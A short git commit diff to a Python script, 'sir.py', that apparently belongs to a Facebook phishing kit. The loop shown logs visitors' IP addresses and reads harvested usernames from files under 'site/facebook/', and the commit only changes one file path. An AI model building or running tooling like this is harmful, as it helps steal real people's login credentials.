a50099f5f47569909d335530d5f6fb8494227e9b
ABIRHOSSAIN10 <84902162+ABIRHOSSAIN10@users.noreply.github.com>
2021-08-23 14:34:11 +0600

    Update sir.py

--- sir.py
+++ sir.py
@@ -9,7 +9,7 @@ while True:
 		print("\n [>] A User Visited the Site From IP : "+ip)
 		tr.close()
 		os.system("rm -rf site/facebook/ip.txt")
-	if os.path.isfile("site/facebook/usernames.txt")==True:
+	if os.path.isfile("/site/facebook/usernames.txt")==True:
 	 #time.sleep(0.75)
 		tr2=open("site/facebook/usernames.txt","r")
 		log2=tr2.readline()
